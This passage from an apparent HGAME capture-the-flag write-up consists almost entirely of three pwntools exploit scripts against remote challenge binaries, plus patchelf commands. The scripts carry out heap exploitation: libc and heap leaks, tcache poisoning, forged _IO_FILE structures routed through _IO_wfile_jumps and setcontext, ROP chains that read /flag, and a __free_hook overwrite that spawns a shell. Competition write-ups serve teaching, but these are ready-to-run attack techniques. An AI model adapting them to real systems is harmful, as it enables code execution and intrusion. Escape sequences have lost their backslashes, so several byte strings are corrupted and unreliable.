	p.interactive()
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6') 

elf=ELF('./pwn')
p=remote('node1.hgame.vidar.club',32272)
#p = process('./pwn')

def add(i,size,content):
	rl(">")
	sl(str(1))
	rl(">")
	sl(str(i))
	rl(">")
	sl(b'a'*7)
	rl(">")
	sl(str(size))
	rl(">")
	s(content)
def free(i):
	rl(">")
	sl(str(2))
	rl(">")
	sl(str(i))
def edit(i,name,size,content):
	rl(">")
	sl(str(3))
	rl(">")
	sl(str(i))
	rl(">")
	sl(name)
	rl(">")
	sl(str(size))
	rl(">")
	s(content)
	
	
def show(i):
	rl(">")
	sl(str(4))
	rl(">")
	sl(str(i))

	

add(0,0x68,b'a')
add(1,0x68,b'a')
add(2,0x68,b'a')
free(0)
free(1)
add(3,0x20,b'a'*(0x10))
show(1)
rl("Information: aaaaaaaaaaaaaaaa")
heap_base=u64(p.recv(6).ljust(8,b'x00'))-0x2d0
li(hex(heap_base))
free(1)
add(0,0x20,b'a')
add(1,0x68,b'a')
add(2,0x68,b'a')

for i in range(20):
	add(i+3,0x90,b'a')
for i in range(7):
	free(i+3)
add(21,0x20,b'a')
free(11)
free(13)
add(22,0x38,b'a')#16
show(16)
libc_base=get_addr64()-2207073
li(hex(libc_base))

system,bin_sh=get_sb()
IO_list_all=libc_base+libc.sym['_IO_list_all']-0x10
setcontext=libc_base+libc.sym['setcontext']
rdi = libc_base+libc.search(asm("pop rdinret")).__next__()
rsi = libc_base+libc.search(asm("pop rsinret")).__next__()
rdx = libc_base+libc.search(asm("pop rdxnret")).__next__()
rdx_r12= libc_base+libc.search(asm("pop rdxnpop r12nret")).__next__()
rax = libc_base+libc.search(asm("pop raxnret")).__next__()
ret = libc_base+libc.search(asm("ret")).__next__()
syscall=libc_base+libc.search(asm("syscallnret")).__next__()
open=libc_base+libc.sym['open']
read=libc_base + libc.sym['read']
write=libc_base + libc.sym['write']
add(23,0x40,b'a')#17
add(24,0x100,b'x00'*0x30+p64(0x81)+b'a'*8)

#add(25,-10,hex(heap_base+0x950))
rl(">")
sl(str(1))
rl(">")
sl(str(25))
rl(">")
sl(b'a'*7)
rl(">")
sl(str(-10))
rl(">")
sl(hex(heap_base+0x1590))
IO_list_all_xor=(heap_base+0x1590>>12)^IO_list_all
edit(18,b'a',0x100,b'x00'*(0x30)+p64(0x81)+p64(IO_list_all_xor))

_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']

chunk3=heap_base+0x1660-0x8 # 伪造的fake_IO结构体的地址

shell=p64(rdi+1)+p64(rdi)+p64(bin_sh)+p64(system)

fake_ret=chunk3+0xe0+0xe0+0x18

IO_FILE1 = p64(0)*3+p64(1)+b'x00'*0x38+p64(0) #_chain
IO_FILE1+= p32(0)+b'x08' #_flags2
IO_FILE1 = IO_FILE1.ljust(0x80,b'x00')+p64(chunk3) #lock
IO_FILE1 = IO_FILE1.ljust(0x90,b'x00')+p64(chunk3+0xe0) #_wide_data *** rdx
IO_FILE1 = IO_FILE1.ljust(0xb0,b'x00')
IO_FILE1 = IO_FILE1.ljust(0xc8,b'x00')+p64(_IO_wfile_jumps) #vtable

IO_FILE1+= b'x00'.ljust(0xa0,b'x00')+p64(fake_ret)+p64(rdi+1)
IO_FILE1+= b'/flagx00x00x00'.ljust(0x30,b'x00')+p64(chunk3+0xe0+0xe8-0x68)+p64(setcontext+61)
IO_FILE1+= p64(rdi+1)*2+shell

add(25,0x68,b'a')

add(26,0x3f0,IO_FILE1)
add(27,0x68,b'x00'*8+p64(chunk3))

rl(">")
sl(str(5))
inter()
```



```
patchelf --replace-needed libc.so.6 路径 文件
patchelf --replace-needed libhgame.so 路径 文件
patchelf --set-interpreter ./ld-2.23.so 路径 文件
```



```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6') 

elf=ELF('./pwn')
p=remote('node1.hgame.vidar.club',31346)
#p = process('./pwn')
def add(i,size):
	rl("5. Exit")
	sl(str(1))
	rl("Index: ")
	sl(str(i))
	rl("Size: ")
	sl(str(size))
	
def free(i):
	rl("5. Exit")
	sl(str(2))
	rl("Index: ")
	sl(str(i))

def edit(i,content):
	rl("5. Exit")
	sl(str(3))
	rl("Index: ")
	sl(str(i))
	rl("Content: ")
	s(content)

def show(i):
	rl("5. Exit")
	sl(str(4))
	rl("Index: ")
	sl(str(i))
add(0,0x520) #0
add(1,0x558) #1
add(2,0x510) #2
add(3,0x550) #3

free(0)
show(0)
libc_base=get_addr64()-2112288
li(hex(libc_base))
system,bin_sh=get_sb()
IO_list_all=libc_base+libc.sym['_IO_list_all']
setcontext=libc_base+libc.sym['setcontext']
rdi = libc_base+libc.search(asm("pop rdinret")).__next__()
rsi = libc_base+libc.search(asm("pop rsinret")).__next__()
rdx = libc_base+0x0000000000066b9a
#rdx_r12= libc_base+libc.search(asm("pop rdxnpop r12nret")).__next__()
rax = libc_base+libc.search(asm("pop raxnret")).__next__()
ret = libc_base+libc.search(asm("ret")).__next__()
syscall=libc_base+libc.search(asm("syscallnret")).__next__()
open=libc_base+libc.sym['open']
read=libc_base + libc.sym['read']
write=libc_base + libc.sym['write']

add(4,0x600)
edit(0,b'a'*(0x10))
show(0)
rl(b'a'*(0x10))
heap_base=u64(p.recv(6).ljust(8,b'x00'))-0x290
li(hex(heap_base))

free(2)
edit(0,p64(libc_base+2113360)*2+p64(heap_base+0x290)+p64(IO_list_all-0x20))
add(5,0x600)

_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']

chunk3=heap_base+0xd20 # 伪造的fake_IO结构体的地址

_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']

fake_IO_FILE =p64(0)*2+p64(1)+p64(chunk3+0x8) 
fake_IO_FILE =fake_IO_FILE.ljust(0x60,b'x00') 
fake_IO_FILE +=p64(0)+p64(chunk3+0xf8)+p64(system) #rdi,rsi
fake_IO_FILE +=p64(heap_base) 
fake_IO_FILE +=p64(0x100) #rdx
fake_IO_FILE =fake_IO_FILE.ljust(0x90, b'x00')
fake_IO_FILE +=p64(chunk3+0x8) #_wide_data,rax1_addr
fake_IO_FILE +=p64(chunk3+0xf0)+p64(rdi+1) #rsp
fake_IO_FILE +=p64(0)+p64(1)+p64(0)*2
fake_IO_FILE +=p64(_IO_wfile_jumps+0x30) # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(setcontext+61)+p64(chunk3+0xc8)
fake_IO_FILE +=p64(read)

edit(2,fake_IO_FILE)

#bug()
rl("5. Exit")
sl(str(5))

sleep(0.1)

orw = p64(rdi) + p64(heap_base+0xea0) 
orw += p64(rsi) + p64(0)
orw += p64(rax)+p64(2)+p64(syscall)

orw += p64(rdi) + p64(3)
orw += p64(rsi)+p64(heap_base+0x100)
orw += p64(read)
orw += p64(rdi) + p64(1)
orw += p64(rsi)+p64(heap_base+0x100)
orw += p64(write)+b'./flagx00x00'
sl(orw)

inter()
```



```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

 
#context(os='linux',arch='i386',log_level='debug') 
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc-2.27.so') 

elf=ELF('./pwn')
p=remote('node1.hgame.vidar.club',31701)
#p = process('./pwn')

def add(i,size,content):
	rl("Your choice:")
	sl(p32(1))
	rl("Index: ")
	sl(str(i))
	rl("Size: ")
	sl(str(size))
	rl("Content: ")
	s(content)
def show(i):
	rl("Your choice:")
	sl(p32(3))
	rl("Index: ")
	sl(str(i))
def free(i):
	rl("Your choice:")
	sl(p32(2))
	rl("Index: ")
	sl(str(i))
for i in range(7):
 add(i,0xf8,"aaaa")

add(7,0xf8,"aaaa")#7
add(8,0x88,"aaaa")#8
add(9,0xf8,"aaaa")#9
add(10,0x88,"aaaa")#10
for i in range(7):
 free(i)
free(8)
free(7)

add(11,0x88,b'a'*0x80+p64(0x90+0x100))

free(9)
#bug()
for i in range(7):
 add(i,0xf8,"/bin/shx00")
add(7,0xf8,"cccc")
show(11)
libc_base=get_addr64()-4111520
li(hex(libc_base))
system,bin_sh=get_sb()
malloc_hook,free_hook=get_hook()
add(8,0x88,b'a')
add(9,0xf8,b'a')

for i in range(7):
 free(i)

free(8)
free(7)
add(12,0x88,b'a'*0x80+p64(0x90+0x100))
free(9)

add(13,0x88,b'a')
free(13)
free(11)
add(14,0xb8,b'x00'*0x60+p64(0x100)+p64(0x90)+p64(free_hook))
add(0,0x88,b'/bin/shx00')
add(1,0x88,p64(system))

#bug()
free(0)

inter()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/7-1740018069.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/4-1740018070.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/8-1740018071.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/8-1740018073.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/10-1740018074.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/8-1740018074.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/0-1740018074.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/4-1740018075.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/9-1740018075.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/0-1740018076.png)